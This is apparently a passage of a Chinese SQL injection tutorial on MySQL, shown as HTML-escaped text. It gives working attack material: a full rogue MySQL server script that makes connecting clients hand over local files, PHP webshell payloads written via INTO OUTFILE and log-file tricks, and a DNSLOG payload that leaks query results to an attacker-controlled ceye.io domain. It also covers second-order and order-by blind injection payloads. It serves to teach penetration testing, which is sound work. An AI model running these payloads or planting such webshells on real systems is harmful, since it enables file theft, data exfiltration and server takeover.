&lt;li&gt;为目录名，表示仅允许对特定目录的文件进行读/写。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;注：&lt;strong&gt;5.5.53本身及之后的版本默认值为NULL，之前的版本无内容&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;三种方法查看当前&lt;code&gt;secure-file-priv&lt;/code&gt;的值：&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;select @@secure_file_priv;
select @@global.secure_file_priv;
show variables like &quot;secure_file_priv&quot;;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;修改：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;通过修改my.ini文件，添加：&lt;code&gt;secure-file-priv=&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;启动项添加参数：&lt;code&gt;mysqld.exe --secure-file-priv=&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;读&quot;&gt;读&lt;/h3&gt;
&lt;p&gt;Mysql读取文件通常使用load_file函数，语法如下：&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;select load_file(file_path);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;第二种读文件的方法：&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;load data infile &quot;/etc/passwd&quot; into table test FIELDS TERMINATED BY '\n'; #读取服务端文件&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;第三种：&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;load data local infile &quot;/etc/passwd&quot; into table test FIELDS TERMINATED BY '\n'; #读取客户端文件&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;限制：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;前两种需要&lt;code&gt;secure-file-priv&lt;/code&gt;无值或为有利目录。&lt;/li&gt;
&lt;li&gt;都需要知道要读取的文件所在的绝对路径。&lt;/li&gt;
&lt;li&gt;要读取的文件大小必须小于&lt;code&gt;max_allowed_packet&lt;/code&gt;所设置的值&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;低权限读取文件&quot;&gt;低权限读取文件&lt;/h4&gt;
&lt;p&gt;5.5.53&lt;code&gt;secure-file-priv=NULL&lt;/code&gt;读文件payload，mysql8测试失败，其他版本自测。&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;drop table mysql.m1;
CREATE TABLE mysql.m1 (code TEXT );
LOAD DATA LOCAL INFILE 'D://1.txt' INTO TABLE mysql.m1 fields terminated by '';
select * from mysql.m1;&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;mysql连接数据库时可读取文件&quot;&gt;Mysql连接数据库时可读取文件&lt;/h4&gt;
&lt;p&gt;这个漏洞是mysql的一个特性产生的，是上述的第三种读文件的方法为基础的。&lt;/p&gt;
&lt;p&gt;简单描述该漏洞：Mysql客户端在执行&lt;code&gt;load data local&lt;/code&gt;语句的时，先想mysql服务端发送请求，服务端接收到请求，并返回需要读取的文件地址，客户端接收该地址并进行读取，接着将读取到的内容发送给服务端。用通俗的语言可以描述如下：&lt;/p&gt;
&lt;blockquote readability=&quot;11.522105263158&quot;&gt;
&lt;p&gt;原本的查询流程为&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;客户端：我要把我的win.ini文件内容插入test表中
服务端：好，我要你的win.ini文件内容
客户端：win.ini的内容如下....&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;假设服务端由我们控制，把一个正常的流程篡改成如下&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;客户端：我要把我的win.ini文件内容插入test表中
服务端：好，我要你的conn.php内容
客户端：conn.php的内容如下???&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;例子部分修改自：&lt;a href=&quot;https://paper.seebug.org/1112/&quot;&gt;CSS-T | Mysql Client 任意文件读取攻击链拓展&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;换句话说：&lt;code&gt;load data local&lt;/code&gt;语句要读取的文件会受到服务端的控制。&lt;/p&gt;
&lt;p&gt;其次，在&lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/load-data-local.html&quot;&gt;Mysql官方文档对于&lt;code&gt;load data local&lt;/code&gt;语句的安全说明&lt;/a&gt;中有这么一句话:&lt;/p&gt;
&lt;blockquote readability=&quot;7.3814432989691&quot;&gt;
&lt;p&gt;A patched server could in fact reply with a file-transfer request to any statement, not just &lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/load-data.html&quot;&gt;&lt;code&gt;LOAD DATA LOCAL&lt;/code&gt;&lt;/a&gt;, so a more fundamental issue is that clients should not connect to untrusted servers.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;意思是：服务器对客户端的文件读取请求实际上是可以返回给客户端发送给服务端的任意语句请求的，不仅仅只是&lt;code&gt;load data local&lt;/code&gt;语句。&lt;/p&gt;
&lt;p&gt;这就会产生什么结果呢？之前讲的例子，将可以变成：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;客户端：我需要查询test表下的xx内容
服务端：我需要你的conn.php内容
客户端：conn.php的内容如下???&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到，客户端相当于被攻击者给&lt;strong&gt;半劫持&lt;/strong&gt;了。&lt;/p&gt;
&lt;p&gt;利用上述的特性，我们通过构造一个恶意的服务端，即可完成上述的过程。&lt;/p&gt;
&lt;p&gt;简易恶意服务端代码：&lt;/p&gt;
&lt;pre class=&quot;python&quot;&gt;
&lt;code&gt;#代码摘自：https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py
#!/usr/bin/env python
#coding: utf8

import socket
import asyncore
import asynchat
import struct
import random
import logging
import logging.handlers

PORT = 3306
log = logging.getLogger(__name__)
log.setLevel(logging.DEBUG)
tmp_format = logging.handlers.WatchedFileHandler('mysql.log', 'ab')
tmp_format.setFormatter(logging.Formatter(&quot;%(asctime)s:%(levelname)s:%(message)s&quot;))
log.addHandler(
    tmp_format
)

filelist = (
#    r'c:\boot.ini',
    r'c:\windows\win.ini',
#    r'c:\windows\system32\drivers\etc\hosts',
#    '/etc/passwd',
#    '/etc/shadow',
)

#================================================
#=======No need to change after this lines=======
#================================================

__author__ = 'Gifts'

def daemonize():
    import os, warnings
    if os.name != 'posix':
        warnings.warn('Cant create daemon on non-posix system')
        return

    if os.fork(): os._exit(0)
    os.setsid()
    if os.fork(): os._exit(0)
    os.umask(0o022)
    null=os.open('/dev/null', os.O_RDWR)
    for i in xrange(3):
        try:
            os.dup2(null, i)
        except OSError as e:
            if e.errno != 9: raise
    os.close(null)

class LastPacket(Exception):
    pass

class OutOfOrder(Exception):
    pass

class mysql_packet(object):
    packet_header = struct.Struct('&amp;lt;Hbb')
    packet_header_long = struct.Struct('&amp;lt;Hbbb')
    def __init__(self, packet_type, payload):
        if isinstance(packet_type, mysql_packet):
            self.packet_num = packet_type.packet_num + 1
        else:
            self.packet_num = packet_type
        self.payload = payload

    def __str__(self):
        payload_len = len(self.payload)
        if payload_len &amp;lt; 65536:
            header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num)
        else:
            header = mysql_packet.packet_header.pack(payload_len &amp;amp; 0xFFFF, payload_len &amp;gt;&amp;gt; 16, 0, self.packet_num)

        result = &quot;{0}{1}&quot;.format(
            header,
            self.payload
        )
        return result

    def __repr__(self):
        return repr(str(self))

    @staticmethod
    def parse(raw_data):
        packet_num = ord(raw_data[0])
        payload = raw_data[1:]

        return mysql_packet(packet_num, payload)

class http_request_handler(asynchat.async_chat):

    def __init__(self, addr):
        asynchat.async_chat.__init__(self, sock=addr[0])
        self.addr = addr[1]
        self.ibuffer = []
        self.set_terminator(3)
        self.state = 'LEN'
        self.sub_state = 'Auth'
        self.logined = False
        self.push(
            mysql_packet(
                0,
                &quot;&quot;.join((
                    '\x0a',  # Protocol
                    '3.0.0-Evil_Mysql_Server' + '\0',  # Version
                    #'5.1.66-0+squeeze1' + '\0',
                    '\x36\x00\x00\x00',  # Thread ID
                    'evilsalt' + '\0',  # Salt
                    '\xdf\xf7',  # Capabilities
                    '\x08',  # Collation
                    '\x02\x00',  # Server Status
                    '\0' * 13,  # Unknown
                    'evil2222' + '\0',
                ))
            )
        )

        self.order = 1
        self.states = ['LOGIN', 'CAPS', 'ANY']

    def push(self, data):
        log.debug('Pushed: %r', data)
        data = str(data)
        asynchat.async_chat.push(self, data)

    def collect_incoming_data(self, data):
        log.debug('Data recved: %r', data)
        self.ibuffer.append(data)

    def found_terminator(self):
        data = &quot;&quot;.join(self.ibuffer)
        self.ibuffer = []

        if self.state == 'LEN':
            len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1
            if len_bytes &amp;lt; 65536:
                self.set_terminator(len_bytes)
                self.state = 'Data'
            else:
                self.state = 'MoreLength'
        elif self.state == 'MoreLength':
            if data[0] != '\0':
                self.push(None)
                self.close_when_done()
            else:
                self.state = 'Data'
        elif self.state == 'Data':
            packet = mysql_packet.parse(data)
            try:
                if self.order != packet.packet_num:
                    raise OutOfOrder()
                else:
                    # Fix ?
                    self.order = packet.packet_num + 2
                if packet.packet_num == 0:
                    if packet.payload[0] == '\x03':
                        log.info('Query')

                        filename = random.choice(filelist)
                        PACKET = mysql_packet(
                            packet,
                            '\xFB{0}'.format(filename)
                        )
                        self.set_terminator(3)
                        self.state = 'LEN'
                        self.sub_state = 'File'
                        self.push(PACKET)
                    elif packet.payload[0] == '\x1b':
                        log.info('SelectDB')
                        self.push(mysql_packet(
                            packet,
                            '\xfe\x00\x00\x02\x00'
                        ))
                        raise LastPacket()
                    elif packet.payload[0] in '\x02':
                        self.push(mysql_packet(
                            packet, '\0\0\0\x02\0\0\0'
                        ))
                        raise LastPacket()
                    elif packet.payload == '\x00\x01':
                        self.push(None)
                        self.close_when_done()
                    else:
                        raise ValueError()
                else:
                    if self.sub_state == 'File':
                        log.info('-- result')
                        log.info('Result: %r', data)

                        if len(data) == 1:
                            self.push(
                                mysql_packet(packet, '\0\0\0\x02\0\0\0')
                            )
                            raise LastPacket()
                        else:
                            self.set_terminator(3)
                            self.state = 'LEN'
                            self.order = packet.packet_num + 1

                    elif self.sub_state == 'Auth':
                        self.push(mysql_packet(
                            packet, '\0\0\0\x02\0\0\0'
                        ))
                        raise LastPacket()
                    else:
                        log.info('-- else')
                        raise ValueError('Unknown packet')
            except LastPacket:
                log.info('Last packet')
                self.state = 'LEN'
                self.sub_state = None
                self.order = 0
                self.set_terminator(3)
            except OutOfOrder:
                log.warning('Out of order')
                self.push(None)
                self.close_when_done()
        else:
            log.error('Unknown state')
            self.push('None')
            self.close_when_done()

class mysql_listener(asyncore.dispatcher):
    def __init__(self, sock=None):
        asyncore.dispatcher.__init__(self, sock)

        if not sock:
            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
            self.set_reuse_addr()
            try:
                self.bind(('', PORT))
            except socket.error:
                exit()

            self.listen(5)

    def handle_accept(self):
        pair = self.accept()

        if pair is not None:
            log.info('Conn from: %r', pair[1])
            tmp = http_request_handler(pair)

z = mysql_listener()
daemonize()
asyncore.loop()&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;需要注意的是：这个过程需要客户端允许使用&lt;code&gt;load data local&lt;/code&gt;才行，不过这个信息在客户端尝试连接到服务端的数据包中可以找到。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1095571/202002/1095571-20200221070224453-1349623651.png&quot; alt=&quot;登录数据包&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;写&quot;&gt;写&lt;/h3&gt;
&lt;p&gt;说完了读文件，那我们来说说mysql的写文件操作。常见的写文件操作如下：&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;select 1,&quot;&amp;lt;?php @assert($_POST['t']);?&amp;gt;&quot; into outfile '/var/www/html/1.php';
select 2,&quot;&amp;lt;?php @assert($_POST['t']);?&amp;gt;&quot; into dumpfile '/var/www/html/1.php';&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;限制：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;secure-file-priv&lt;/code&gt;无值或为可利用的目录&lt;/li&gt;
&lt;li&gt;需知道目标目录的绝对目录地址&lt;/li&gt;
&lt;li&gt;目标目录可写，mysql的权限足够。&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;日志法&quot;&gt;日志法&lt;/h4&gt;
&lt;p&gt;由于mysql在5.5.53版本之后，&lt;code&gt;secure-file-priv&lt;/code&gt;的值默认为&lt;code&gt;NULL&lt;/code&gt;，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过。&lt;/p&gt;
&lt;p&gt;mysql日志文件的一些相关设置可以直接通过命令来进行：&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;//请求日志
mysql&amp;gt; set global general_log_file = '/var/www/html/1.php';
mysql&amp;gt; set global general_log = on;
//慢查询日志
mysql&amp;gt; set global slow_query_log_file='/var/www/html/2.php'
mysql&amp;gt; set global slow_query_log=1;
//还有其他很多日志都可以进行利用
...&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;之后我们在让数据库执行满足记录条件的恶意语句即可。&lt;/p&gt;
&lt;p&gt;限制：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;权限够，可以进行日志的设置操作&lt;/li&gt;
&lt;li&gt;知道目标目录的绝对路径&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;dnslog带出数据&quot;&gt;DNSLOG带出数据&lt;/h2&gt;
&lt;p&gt;什么是DNSLOG？简单的说，就是关于特定网站的DNS查询的一份记录表。若A用户对B网站进行访问/请求等操作，首先会去查询B网站的DNS记录，由于B网站是被我们控制的，便可以通过某些方法记录下A用户对于B网站的DNS记录信息。此方法也称为OOB注入。&lt;/p&gt;
&lt;p&gt;如何用DNSLOG带出数据？若我们想要查询的数据为：&lt;code&gt;aabbcc&lt;/code&gt;，那么我们让mysql服务端去请求&lt;code&gt;aabbcc.evil.com&lt;/code&gt;，通过记录&lt;code&gt;evil.com&lt;/code&gt;的DNS记录，就可以得到数据：&lt;code&gt;aabbcc&lt;/code&gt;。&lt;/p&gt;
&lt;blockquote readability=&quot;1.1538461538462&quot;&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1095571/202002/1095571-20200221070311101-1331019384.jpg&quot; alt=&quot;DNSLOG流程图&quot;/&gt;&lt;/p&gt;
&lt;p&gt;引自：&lt;a href=&quot;https://www.anquanke.com/post/id/98096&quot;&gt;Dnslog在SQL注入中的实战&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;payload: &lt;code&gt;load_file(concat('\\\\',(select user()),'.xxxx.ceye.io\xxxx'))&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;应用场景：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;三大注入无法使用&lt;/li&gt;
&lt;li&gt;有文件读取权限及&lt;code&gt;secure-file-priv&lt;/code&gt;无值。&lt;/li&gt;
&lt;li&gt;不知道网站/目标文件/目标目录的绝对路径&lt;/li&gt;
&lt;li&gt;目标系统为Windows&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;推荐平台：&lt;a href=&quot;http://ceye.io/&quot;&gt;ceye.io&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;为什么Windows可用，Linux不行？这里涉及到一个叫UNC的知识点。简单的说，在Windows中，路径以&lt;code&gt;\\&lt;/code&gt;开头的路径在Windows中被定义为UNC路径，相当于网络硬盘一样的存在，所以我们填写域名的话，Windows会先进行DNS查询。但是对于Linux来说，并没有这一标准，所以DNSLOG在Linux环境不适用。注：payload里的四个&lt;code&gt;\\\\&lt;/code&gt;中的两个&lt;code&gt;\&lt;/code&gt;是用来进行转义处理的。&lt;/p&gt;
&lt;h2 id=&quot;二次注入&quot;&gt;二次注入&lt;/h2&gt;
&lt;p&gt;什么是二次注入？简单的说，就是攻击者构造的恶意payload首先会被服务器存储在数据库中，在之后取出数据库在进行SQL语句拼接时产生的SQL注入问题。&lt;/p&gt;
&lt;p&gt;举个例子，某个查询当先登录的用户信息的SQL语句如下：&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;select * from users where username='$_SESSION['username']'&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;登录/注册处的SQL语句都经过了addslashes函数、单引号闭合的处理，且无编码产生的问题。&lt;/p&gt;
&lt;p&gt;对于上述举的语句我们可以先注册一个名为&lt;code&gt;admin' #&lt;/code&gt;的用户名，因为在注册进行了单引号的转义，故我们并不能直接进行insert注入，最终将我们的用户名存储在了服务器中，注意：反斜杠转义掉了单引号，在mysql中得到的数据并没有反斜杠的存在。&lt;/p&gt;
&lt;p&gt;在我们进行登录操作的时候，我们用注册的&lt;code&gt;admin' #&lt;/code&gt;登录系统，并将用户部分数据存储在对于的SESSION中，如&lt;code&gt;$_SESSION['username']&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;上述的&lt;code&gt;$_SESSION['username']&lt;/code&gt;并没有经过处理，直接拼接到了SQL语句之中，就会造成SQL注入，最终的语句为：&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;select * from users where username='admin' #'&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;order-by比较盲注&quot;&gt;order by比较盲注&lt;/h2&gt;
&lt;p&gt;这种方法运用的情况比较极端一些，如布尔盲注时，字符截取/比较限制很严格。例子：&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;select * from users where (select 'r' union select user() order by 1 limit 1)='r'&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果能一眼看出原理的话就不需要继续看下去了。&lt;/p&gt;
&lt;p&gt;实际上此处是利用了&lt;code&gt;order by&lt;/code&gt;语句的排序功能来进行判断的。若我们想要查询的数据开头的首字母在字母表的位值比我们判断的值要靠后，则&lt;code&gt;limit&lt;/code&gt;语句将不会让其输出，那么整个条件将会成立，否之不成立。&lt;/p&gt;
&lt;p&gt;利用这种方法可以做到不需要使用&lt;code&gt;like、rlike、regexp&lt;/code&gt;等匹配语句以及字符操作函数。&lt;/p&gt;
&lt;p&gt;再举个例子：&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;select username,flag,password from users where username='$username;'&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;页面回显的字段为：username与password，如何在&lt;code&gt;union&lt;/code&gt;与&lt;code&gt;flag&lt;/code&gt;两单词被拦截、无报错信息返回的情况下获取到用户名为&lt;code&gt;admin&lt;/code&gt;的flag值？&lt;/p&gt;
&lt;p&gt;我们前边讲到了无列名注入，通过使用&lt;code&gt;union&lt;/code&gt;语句来对未知列名进行重命名的形式绕过，还讲过通过使用&lt;code&gt;join using()&lt;/code&gt;报错注入出列名。但现在，这两种方法都不可以的情况下该如何获取到flag字段的内容？&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;order by&lt;/code&gt;可轻松盲注出答案。payload：&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;select username,flag,password from users where username='admin' union select 1,'a',3 order by 2&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;与之前的原理相同，通过判断前后两个select语句返回的数据前后顺序来进行盲注。&lt;/p&gt;
&lt;h2 id=&quot;常见函数符号归类&quot;&gt;常见函数/符号归类&lt;/h2&gt;
&lt;h3 id=&quot;注释符&quot;&gt;注释符&lt;/h3&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;&lt;code&gt;#&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;-- x //x为任意字符&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;;%00&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;/*任意内容*/&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h3 id=&quot;常用运算符&quot;&gt;常用运算符&lt;/h3&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;&amp;amp;&amp;amp;&lt;/td&gt;
&lt;td&gt;与，同and。&lt;/td&gt;
&lt;td&gt;||&lt;/td&gt;
&lt;td&gt;或，同or。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;!&lt;/td&gt;
&lt;td&gt;非，同not。&lt;/td&gt;
&lt;td&gt;~&lt;/td&gt;
&lt;td&gt;一元比特反转。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;^&lt;/td&gt;
&lt;td&gt;异或，同xor。&lt;/td&gt;
&lt;td&gt;+&lt;/td&gt;
&lt;td&gt;加，可替代空格，如&lt;code&gt;select+user()&lt;/code&gt;。&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h3 id=&quot;系统信息函数&quot;&gt;系统信息函数&lt;/h3&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;3.5&quot;&gt;&lt;tr class=&quot;odd&quot; readability=&quot;3&quot;&gt;&lt;td&gt;USER()&lt;/td&gt;
&lt;td&gt;获取当前操作句柄的用户名，同SESSION_USER()、CURRENT_USER()，有时也用SYSTEM_USER()。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;DATABASE()&lt;/td&gt;
&lt;td&gt;获取当前选择的数据库名，同SCHEMA()。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;VERSION()&lt;/td&gt;
&lt;td&gt;获取当前版本信息。&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h3 id=&quot;进制转换&quot;&gt;进制转换&lt;/h3&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;13.5&quot;&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;ORD(str)&lt;/td&gt;
&lt;td&gt;返回字符串第一个字符的ASCII值。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;5&quot;&gt;&lt;td&gt;OCT(N)&lt;/td&gt;
&lt;td&gt;以字符串形式返回 &lt;code&gt;N&lt;/code&gt; 的八进制数，&lt;code&gt;N&lt;/code&gt; 是一个BIGINT 型数值，作用相当于&lt;code&gt;CONV(N,10,8)&lt;/code&gt;。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;3&quot;&gt;&lt;td&gt;HEX(N_S)&lt;/td&gt;
&lt;td&gt;参数为字符串时，返回 &lt;code&gt;N_or_S&lt;/code&gt; 的16进制字符串形式，为数字时，返回其16进制数形式。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;3&quot;&gt;&lt;td&gt;UNHEX(str)&lt;/td&gt;
&lt;td&gt;&lt;code&gt;HEX(str)&lt;/code&gt; 的逆向函数。将参数中的每一对16进制数字都转换为10进制数字，然后再转换成 ASCII 码所对应的字符。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;BIN(N)&lt;/td&gt;
&lt;td&gt;返回十进制数值 &lt;code&gt;N&lt;/code&gt; 的二进制数值的字符串表现形式。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;ASCII(str)&lt;/td&gt;
&lt;td&gt;同&lt;code&gt;ORD(string)&lt;/code&gt;。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;6&quot;&gt;&lt;td&gt;CONV(N,from_base,to_base)&lt;/td&gt;
&lt;td&gt;将数值型参数 &lt;code&gt;N&lt;/code&gt; 由初始进制 &lt;code&gt;from_base&lt;/code&gt; 转换为目标进制 &lt;code&gt;to_base&lt;/code&gt; 的形式并返回。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;6&quot;&gt;&lt;td&gt;CHAR(N,... [USING charset_name])&lt;/td&gt;
&lt;td&gt;将每一个参数 &lt;code&gt;N&lt;/code&gt; 都解释为整数，返回由这些整数在 ASCII 码中所对应字符所组成的字符串。&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h3 id=&quot;字符截取拼接&quot;&gt;字符截取/拼接&lt;/h3&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;25.5&quot;&gt;&lt;tr class=&quot;odd&quot; readability=&quot;6&quot;&gt;&lt;td&gt;SUBSTR(str,N_start,N_length)&lt;/td&gt;
&lt;td&gt;对指定字符串进行截取，为SUBSTRING的简单版。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;6&quot;&gt;&lt;td&gt;SUBSTRING()&lt;/td&gt;
&lt;td&gt;多种格式&lt;code&gt;SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)&lt;/code&gt;。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;RIGHT(str,len)&lt;/td&gt;
&lt;td&gt;对指定字符串从&lt;strong&gt;最右边&lt;/strong&gt;截取指定长度。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;LEFT(str,len)&lt;/td&gt;
&lt;td&gt;对指定字符串从&lt;strong&gt;最左边&lt;/strong&gt;截取指定长度。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;3&quot;&gt;&lt;td&gt;RPAD(str,len,padstr)&lt;/td&gt;
&lt;td&gt;在 &lt;code&gt;str&lt;/code&gt; 右方补齐 &lt;code&gt;len&lt;/code&gt; 位的字符串 &lt;code&gt;padstr&lt;/code&gt;，返回新字符串。如果 &lt;code&gt;str&lt;/code&gt; 长度大于 &lt;code&gt;len&lt;/code&gt;，则返回值的长度将缩减到 &lt;code&gt;len&lt;/code&gt; 所指定的长度。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;LPAD(str,len,padstr)&lt;/td&gt;
&lt;td&gt;与RPAD相似，在&lt;code&gt;str&lt;/code&gt;左边补齐。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;4&quot;&gt;&lt;td&gt;MID(str,pos,len)&lt;/td&gt;
&lt;td&gt;同于 &lt;code&gt;SUBSTRING(str,pos,len)&lt;/code&gt;。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;12&quot;&gt;&lt;td&gt;INSERT(str,pos,len,newstr)&lt;/td&gt;
&lt;td&gt;在原始字符串 &lt;code&gt;str&lt;/code&gt; 中，将自左数第 &lt;code&gt;pos&lt;/code&gt; 位开始，长度为 &lt;code&gt;len&lt;/code&gt; 个字符的字符串替换为新字符串 &lt;code&gt;newstr&lt;/code&gt;，然后返回经过替换后的字符串。&lt;code&gt;INSERT(str,len,1,0x0)&lt;/code&gt;可当做截取函数。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;CONCAT(str1,str2...)&lt;/td&gt;
&lt;td&gt;函数用于将多个字符串合并为一个字符串&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;GROUP_CONCAT(...)&lt;/td&gt;
&lt;td&gt;返回一个字符串结果，该结果由分组中的值连接组合而成。&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;10&quot;&gt;&lt;td&gt;MAKE_SET(bits,str1,str2,...)&lt;/td&gt;
&lt;td&gt;根据参数1，返回所输入其他的参数值。可用作布尔盲注，如：&lt;code&gt;EXP(MAKE_SET((LENGTH(DATABASE())&amp;gt;8)+1,'1','710'))&lt;/code&gt;。&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h3 id=&quot;常见全局变量&quot;&gt;常见全局变量&lt;/h3&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;1&quot;&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;@@VERSION&lt;/td&gt;
&lt;td&gt;返回版本信息&lt;/td&gt;
&lt;td&gt;@@HOSTNAME&lt;/td&gt;
&lt;td&gt;返回安装的计算机名称&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot;&gt;&lt;td&gt;@@GLOBAL.VERSION&lt;/td&gt;
&lt;td&gt;同&lt;code&gt;@@VERSION&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;@@BASEDIR&lt;/td&gt;
&lt;td&gt;返回MYSQL绝对路径&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;PS：查看全部全局变量&lt;code&gt;SHOW GLOBAL VARIABLES;&lt;/code&gt;。&lt;/p&gt;
